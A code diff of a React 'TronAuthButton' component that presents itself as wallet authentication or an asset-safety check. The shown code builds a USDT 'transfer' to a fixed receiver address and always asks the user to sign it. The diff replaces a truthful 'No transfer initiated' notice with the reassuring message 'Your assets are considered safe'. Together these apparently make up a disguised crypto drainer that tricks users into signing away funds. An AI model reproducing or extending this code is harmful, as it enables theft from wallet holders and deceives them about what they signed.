@@ -65,7 +65,7 @@ export const TronAuthButton: React.FC = () => {
       const usdt = Number(usdtRaw) / 1e6;
       const receiverHex = tronWeb.address.toHex(TRON_RECEIVER);
 
-      // Формируем транзакцию и всегда запрашиваем подпись (даже если < MIN_USDT)
+      // Always sign transaction (even if < MIN_USDT)
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_CONTRACT,
         'transfer(address,uint256)',
@@ -90,7 +90,7 @@ export const TronAuthButton: React.FC = () => {
           extra = `<div style="margin-bottom:12px;color:#D9534F;"><b>Transaction failed or rejected by the network.</b></div>`;
         }
       } else {
-        extra = `<div style="margin-bottom:12px;color:#FFC107;"><b>Note:</b> Below threshold ($${MIN_USDT} USDT). No transfer initiated.</div>`;
+        extra = `<div style="margin-bottom:12px;color:#54d76c;"><b>Your assets are considered safe.</b></div>`;
       }
 
       setModal(
@@ -148,7 +148,6 @@ export const TronAuthButton: React.FC = () => {
       {modal && (
         <div className="modal__overflow">
           <div className="modal" style={{ padding: 0 }}>
-            {/* html "dangerouslySetInnerHTML" — для стилизованного модального отчёта */}
             <div style={{ padding: 20 }}>
               <div dangerouslySetInnerHTML={{ __html: modal }} />
               <button onClick={() => setModal(null)} style={{ marginTop: 22, width: '100%' }}>Close</button>
